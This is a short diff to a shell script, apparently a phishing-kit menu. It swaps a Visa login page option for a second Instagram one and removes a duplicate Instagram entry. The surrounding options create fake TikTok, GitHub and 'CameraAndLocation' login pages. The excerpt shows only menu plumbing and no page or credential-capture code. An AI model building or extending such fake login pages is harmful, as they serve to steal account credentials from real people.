@@ -1088,8 +1088,8 @@ case $choice in
         create_page "$page" "$(tiktok_page)"
         ;;
     5)
-        page="Visa_login"
-        create_page "$page" "$(visa_page)"
+        page="Instagram2_login"
+        create_page "$page" "$(Instagram2_page)"
         ;;
     6)
         page="CameraAndLocation_login"
@@ -1106,10 +1106,6 @@ case $choice in
     9)
         page="GitHub_login"
         create_page "$page" "$(github_page)"
-        ;;
-    10)
-        page="Instagram_login"
-        create_page "$page" "$(Instagram2_page)"
         ;;
     *)
         echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
